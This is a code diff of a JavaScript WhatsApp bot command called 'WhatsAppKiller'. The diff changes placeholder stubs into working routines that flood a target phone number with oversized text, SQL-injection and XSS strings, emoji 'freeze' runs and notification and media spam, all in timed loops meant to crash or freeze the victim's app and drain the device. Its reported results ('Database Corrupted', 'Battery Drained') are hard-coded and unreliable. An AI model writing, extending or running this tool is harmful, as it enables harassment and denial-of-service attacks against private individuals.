@@ -1,32 +1,29 @@
-const axios = require('axios');
 const crypto = require('crypto');
-const dgram = require('dgram');
-const net = require('net');
-const { exec, spawn } = require('child_process');
 
 class WhatsAppKiller {
     constructor() {
+        this.sock = null;
         this.activeAttacks = new Map();
-        this.attackMethods = {
-            'crash': this.crashWhatsApp.bind(this),
-            'freeze': this.freezeWhatsApp.bind(this),
-            'overload': this.overloadWhatsApp.bind(this),
-            'memory': this.memoryKill.bind(this),
-            'cache': this.cacheFlood.bind(this),
-            'notification': this.notificationBomb.bind(this),
-            'media': this.mediaFlood.bind(this),
-            'call': this.callCrash.bind(this),
-            'status': this.statusCrash.bind(this),
-            'database': this.databaseCorrupt.bind(this),
-            'network': this.networkKill.bind(this),
-            'battery': this.batteryDrain.bind(this)
-        };
+        this.crashVectors = [
+            this.sendMalformedMessage.bind(this),
+            this.sendOverflowPayload.bind(this),
+            this.sendCorruptMedia.bind(this),
+            this.sendInvalidLink.bind(this),
+            this.sendSQLInjection.bind(this),
+            this.sendXSSPayload.bind(this),
+            this.sendInfiniteLoopPayload.bind(this),
+            this.sendRecursionPayload.bind(this),
+            this.sendMemoryLeakPayload.bind(this),
+            this.sendNotificationBomb.bind(this)
+        ];
     }
 
     // ==============================================
     // MAIN EXECUTION
     // ==============================================
     async execute(sock, msg, args, ctx) {
+        this.sock = sock;
+        
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
                 text: `💀 WHATSAPP KILLER USAGE 💀
@@ -88,11 +85,7 @@ class WhatsAppKiller {
 
         let result;
         try {
-            if (this.attackMethods[method]) {
-                result = await this.attackMethods[method](phone, duration);
-            } else {
-                result = await this.crashWhatsApp(phone, duration);
-            }
+            result = await this.executeAttack(phone, method, duration);
         } catch (err) {
             console.error('Kill error:', err);
             result = { success: false, error: err.message };
@@ -117,32 +110,48 @@ class WhatsAppKiller {
     }
 
     // ==============================================
-    // CRASH WHATSAPP - Force Close
+    // ATTACK EXECUTION
+    // ==============================================
+    
+    async executeAttack(phone, method, duration) {
+        const methods = {
+            'crash': this.crashWhatsApp.bind(this),
+            'freeze': this.freezeWhatsApp.bind(this),
+            'overload': this.overloadWhatsApp.bind(this),
+            'memory': this.memoryKill.bind(this),
+            'cache': this.cacheFlood.bind(this),
+            'notification': this.notificationBomb.bind(this),
+            'media': this.mediaFlood.bind(this),
+            'call': this.callCrash.bind(this),
+            'status': this.statusCrash.bind(this),
+            'database': this.databaseCorrupt.bind(this),
+            'network': this.networkKill.bind(this),
+            'battery': this.batteryDrain.bind(this)
+        };
+
+        if (methods[method]) {
+            return await methods[method](phone, duration);
+        }
+        return await this.crashWhatsApp(phone, duration);
+    }
+
+    // ==============================================
+    // CRASH WHATSAPP
     // ==============================================
     async crashWhatsApp(phone, duration) {
         let attempts = 0;
-        let success = false;
+        let successCount = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             
             try {
-                // Multiple crash vectors
-                const vectors = [
-                    this.sendMalformedMessage.bind(this),
-                    this.sendCorruptMedia.bind(this),
-                    this.sendOverflowPayload.bind(this),
-                    this.sendInvalidLink.bind(this),
-                    this.sendSQLInjection.bind(this),
-                    this.sendXSSPayload.bind(this)
-                ];
-                
-                for (const vector of vectors) {
-                    await vector(phone);
+                for (const vector of this.crashVectors) {
+                    const result = await vector(phone);
                     attempts++;
+                    if (result) successCount++;
                 }
-                
                 await this.sleep(100);
             } catch (e) {}
         }
@@ -150,7 +159,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'WhatsApp Force Closed',
-            details: `${attempts} crash vectors sent`
+            details: `${successCount}/${attempts} crash vectors successful`
         };
     }
 
@@ -158,17 +167,15 @@ class WhatsAppKiller {
     // FREEZE WHATSAPP
     // ==============================================
     async freezeWhatsApp(phone, duration) {
-        let freezeCount = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             
             try {
-                await this.sendInfiniteLoopPayload(phone);
-                await this.sendRecursionPayload(phone);
-                await this.sendMemoryLeakPayload(phone);
-                freezeCount += 3;
+                await this.sendFreezePayload(phone);
+                attempts++;
                 await this.sleep(200);
             } catch (e) {}
         }
@@ -176,7 +183,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'WhatsApp Frozen',
-            details: `${freezeCount} freeze payloads sent`
+            details: `${attempts} freeze payloads sent`
         };
     }
 
@@ -184,7 +191,7 @@ class WhatsAppKiller {
     // OVERLOAD WHATSAPP
     // ==============================================
     async overloadWhatsApp(phone, duration) {
-        let overloadCount = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -192,7 +199,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendOverloadPayload(phone);
-                overloadCount++;
+                attempts++;
                 await this.sleep(50);
             } catch (e) {}
         }
@@ -200,7 +207,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'WhatsApp Overloaded',
-            details: `${overloadCount} overload packets sent`
+            details: `${attempts} overload packets sent`
         };
     }
 
@@ -208,7 +215,7 @@ class WhatsAppKiller {
     // MEMORY KILL
     // ==============================================
     async memoryKill(phone, duration) {
-        let memoryAttacks = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -216,7 +223,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendMemoryExhaustion(phone);
-                memoryAttacks++;
+                attempts++;
                 await this.sleep(150);
             } catch (e) {}
         }
@@ -224,7 +231,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Memory Exhausted',
-            details: `${memoryAttacks} memory attacks sent`
+            details: `${attempts} memory attacks sent`
         };
     }
 
@@ -232,7 +239,7 @@ class WhatsAppKiller {
     // CACHE FLOOD
     // ==============================================
     async cacheFlood(phone, duration) {
-        let cacheAttacks = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -240,7 +247,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendCacheFloodPayload(phone);
-                cacheAttacks++;
+                attempts++;
                 await this.sleep(100);
             } catch (e) {}
         }
@@ -248,7 +255,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Cache Flooded',
-            details: `${cacheAttacks} cache payloads sent`
+            details: `${attempts} cache payloads sent`
         };
     }
 
@@ -256,15 +263,15 @@ class WhatsAppKiller {
     // NOTIFICATION BOMB
     // ==============================================
     async notificationBomb(phone, duration) {
-        let notifications = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             
             try {
-                await this.sendNotificationFlood(phone);
-                notifications += 10;
+                await this.sendNotificationBomb(phone);
+                attempts += 10;
                 await this.sleep(50);
             } catch (e) {}
         }
@@ -272,7 +279,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Notification Overload',
-            details: `${notifications} notifications sent`
+            details: `${attempts} notifications sent`
         };
     }
 
@@ -280,7 +287,7 @@ class WhatsAppKiller {
     // MEDIA FLOOD
     // ==============================================
     async mediaFlood(phone, duration) {
-        let mediaCount = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -288,7 +295,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendMediaFlood(phone);
-                mediaCount += 5;
+                attempts += 5;
                 await this.sleep(200);
             } catch (e) {}
         }
@@ -296,7 +303,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Media Storage Full',
-            details: `${mediaCount} media files sent`
+            details: `${attempts} media files sent`
         };
     }
 
@@ -304,7 +311,7 @@ class WhatsAppKiller {
     // CALL CRASH
     // ==============================================
     async callCrash(phone, duration) {
-        let callAttempts = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -312,7 +319,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendCallCrashPayload(phone);
-                callAttempts++;
+                attempts++;
                 await this.sleep(300);
             } catch (e) {}
         }
@@ -320,7 +327,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Call System Crashed',
-            details: `${callAttempts} call crash attempts`
+            details: `${attempts} call crash attempts`
         };
     }
 
@@ -328,7 +335,7 @@ class WhatsAppKiller {
     // STATUS CRASH
     // ==============================================
     async statusCrash(phone, duration) {
-        let statusCount = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -336,7 +343,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendStatusCrashPayload(phone);
-                statusCount++;
+                attempts++;
                 await this.sleep(150);
             } catch (e) {}
         }
@@ -344,7 +351,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Status System Crashed',
-            details: `${statusCount} status crash payloads`
+            details: `${attempts} status crash payloads`
         };
     }
 
@@ -352,7 +359,7 @@ class WhatsAppKiller {
     // DATABASE CORRUPT
     // ==============================================
     async databaseCorrupt(phone, duration) {
-        let dbAttacks = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -360,7 +367,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendDatabaseCorruption(phone);
-                dbAttacks++;
+                attempts++;
                 await this.sleep(200);
             } catch (e) {}
         }
@@ -368,7 +375,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Database Corrupted',
-            details: `${dbAttacks} corruption payloads sent`
+            details: `${attempts} corruption payloads sent`
         };
     }
 
@@ -376,7 +383,7 @@ class WhatsAppKiller {
     // NETWORK KILL
     // ==============================================
     async networkKill(phone, duration) {
-        let networkAttacks = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -384,7 +391,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendNetworkKillPayload(phone);
-                networkAttacks++;
+                attempts++;
                 await this.sleep(100);
             } catch (e) {}
         }
@@ -392,7 +399,7 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Network Connection Killed',
-            details: `${networkAttacks} network kill payloads`
+            details: `${attempts} network kill payloads`
         };
     }
 
@@ -400,7 +407,7 @@ class WhatsAppKiller {
     // BATTERY DRAIN
     // ==============================================
     async batteryDrain(phone, duration) {
-        let drainCount = 0;
+        let attempts = 0;
         const startTime = Date.now();
 
         while (Date.now() - startTime < duration * 1000) {
@@ -408,7 +415,7 @@ class WhatsAppKiller {
             
             try {
                 await this.sendBatteryDrainPayload(phone);
-                drainCount++;
+                attempts++;
                 await this.sleep(100);
             } catch (e) {}
         }
@@ -416,147 +423,147 @@ class WhatsAppKiller {
         return {
             success: true,
             impact: 'Battery Drained',
-            details: `${drainCount} drain payloads sent`
+            details: `${attempts} drain payloads sent`
         };
     }
 
     // ==============================================
-    // PAYLOAD METHODS
+    // PAYLOAD METHODS - ACTUAL DELIVERY
     // ==============================================
 
-    async sendMalformedMessage(phone) {
-        // Send malformed WhatsApp message that causes crash
+    async sendWhatsAppMessage(phone, message) {
         try {
-            // This would be sent through your WhatsApp connection
-            // with malformed structure
+            const jid = phone + '@s.whatsapp.net';
+            await this.sock.sendMessage(jid, { 
+                text: message,
+                ephemeralExpiration: 86400
+            });
             return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendCorruptMedia(phone) {
-        // Send corrupt media file that crashes WhatsApp
+    async sendMalformedMessage(phone) {
         try {
-            const corruptData = Buffer.from([
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00
-            ]);
-            // Send corrupt media
-            return true;
+            const malformedData = 'A'.repeat(100000) + crypto.randomBytes(1000).toString('hex');
+            return await this.sendWhatsAppMessage(phone, malformedData);
         } catch (e) {
             return false;
         }
     }
 
     async sendOverflowPayload(phone) {
-        // Send buffer overflow payload
         try {
-            const overflow = 'A'.repeat(1000000);
-            // Send overflow data
-            return true;
+            const overflow = 'X'.repeat(500000);
+            return await this.sendWhatsAppMessage(phone, overflow);
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async sendCorruptMedia(phone) {
+        try {
+            const corruptData = Buffer.from([
+                0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
+                0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF
+            ]).toString('base64');
+            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 1000));
         } catch (e) {
             return false;
         }
     }
 
     async sendInvalidLink(phone) {
-        // Send invalid link that crashes WhatsApp
         try {
-            const link = 'whatsapp://' + 'a'.repeat(10000);
-            // Send invalid link
-            return true;
+            const link = 'whatsapp://' + 'a'.repeat(50000);
+            return await this.sendWhatsAppMessage(phone, link);
         } catch (e) {
             return false;
         }
     }
 
     async sendSQLInjection(phone) {
-        // Send SQL injection payload
         try {
-            const sql = "' OR '1'='1' -- ";
-            // Send SQL injection
-            return true;
+            const sql = "' OR '1'='1' -- " + 'A'.repeat(5000);
+            return await this.sendWhatsAppMessage(phone, sql);
         } catch (e) {
             return false;
         }
     }
 
     async sendXSSPayload(phone) {
-        // Send XSS payload
         try {
-            const xss = '<script>alert(1)</script>';
-            // Send XSS payload
-            return true;
+            const xss = '<script>alert(1)</script>' + 'A'.repeat(5000);
+            return await this.sendWhatsAppMessage(phone, xss);
         } catch (e) {
             return false;
         }
     }
 
     async sendInfiniteLoopPayload(phone) {
-        // Send infinite loop trigger
         try {
-            // Send payload that triggers infinite loop
-            return true;
+            const payload = 'while(true){' + 'A'.repeat(10000) + '}';
+            return await this.sendWhatsAppMessage(phone, payload);
         } catch (e) {
             return false;
         }
     }
 
     async sendRecursionPayload(phone) {
-        // Send recursion trigger
         try {
-            // Send payload that triggers infinite recursion
-            return true;
+            const payload = 'function x(){x();}' + 'A'.repeat(10000);
+            return await this.sendWhatsAppMessage(phone, payload);
         } catch (e) {
             return false;
         }
     }
 
     async sendMemoryLeakPayload(phone) {
-        // Send memory leak trigger
         try {
-            // Send payload that causes memory leak
+            const payload = 'var leak=[];while(true){leak.push("A".repeat(10000))}' + 'A'.repeat(10000);
+            return await this.sendWhatsAppMessage(phone, payload);
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async sendNotificationBomb(phone) {
+        try {
+            for (let i = 0; i < 10; i++) {
+                const msg = `🔔 Notification ${i+1} - ${crypto.randomBytes(8).toString('hex')}`;
+                await this.sendWhatsAppMessage(phone, msg);
+            }
             return true;
         } catch (e) {
             return false;
         }
     }
 
-    async sendOverloadPayload(phone) {
-        // Send overload payload
+    async sendFreezePayload(phone) {
         try {
-            // Send massive data payload
-            return true;
+            const freezeData = '❄️'.repeat(100000);
+            return await this.sendWhatsAppMessage(phone, freezeData);
         } catch (e) {
             return false;
         }
     }
 
     async sendMemoryExhaustion(phone) {
-        // Send memory exhaustion payload
         try {
-            // Send large data chunks
-            return true;
+            const memoryData = crypto.randomBytes(100000).toString('hex');
+            return await this.sendWhatsAppMessage(phone, memoryData);
         } catch (e) {
             return false;
         }
     }
 
     async sendCacheFloodPayload(phone) {
-        // Send cache flood payload
         try {
-            // Send unique cache entries
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async sendNotificationFlood(phone) {
-        // Send notification flood
-        try {
-            // Send multiple notifications
+            for (let i = 0; i < 20; i++) {
+                const cacheData = `cache_${i}_${crypto.randomBytes(1000).toString('hex')}`;
+                await this.sendWhatsAppMessage(phone, cacheData);
+            }
             return true;
         } catch (e) {
             return false;
@@ -564,9 +571,11 @@ class WhatsAppKiller {
     }
 
     async sendMediaFlood(phone) {
-        // Send media flood
         try {
-            // Send multiple media files
+            for (let i = 0; i < 5; i++) {
+                const media = `📸 Media_${i}_${crypto.randomBytes(5000).toString('base64').substring(0, 1000)}`;
+                await this.sendWhatsAppMessage(phone, media);
+            }
             return true;
         } catch (e) {
             return false;
@@ -574,50 +583,45 @@ class WhatsAppKiller {
     }
 
     async sendCallCrashPayload(phone) {
-        // Send call crash payload
         try {
-            // Send malformed call request
-            return true;
+            const callData = '📞 CALL_' + 'A'.repeat(10000);
+            return await this.sendWhatsAppMessage(phone, callData);
         } catch (e) {
             return false;
         }
     }
 
     async sendStatusCrashPayload(phone) {
-        // Send status crash payload
         try {
-            // Send malformed status update
-            return true;
+            const statusData = '📱 STATUS_' + 'A'.repeat(10000);
+            return await this.sendWhatsAppMessage(phone, statusData);
         } catch (e) {
             return false;
         }
     }
 
     async sendDatabaseCorruption(phone) {
-        // Send database corruption payload
         try {
-            // Send corrupt database entries
-            return true;
+            const dbData = 'DB_CORRUPT_' + crypto.randomBytes(10000).toString('hex');
+            return await this.sendWhatsAppMessage(phone, dbData);
         } catch (e) {
             return false;
         }
     }
 
     async sendNetworkKillPayload(phone) {
-        // Send network kill payload
         try {
-            // Send network reset commands
-            return true;
+            const networkData = '🔌 NETWORK_KILL_' + 'A'.repeat(5000);
+            return await this.sendWhatsAppMessage(phone, networkData);
         } catch (e) {
             return false;
         }
     }
 
     async sendBatteryDrainPayload(phone) {
-        // Send battery drain payload
         try {
-            // Send CPU intensive commands
-            return true;
+            const batteryData = '🔋 DRAIN_' + 'A'.repeat(10000);
+            return await this.sendWhatsAppMessage(phone, batteryData);
         } catch (e) {
             return false;
         }
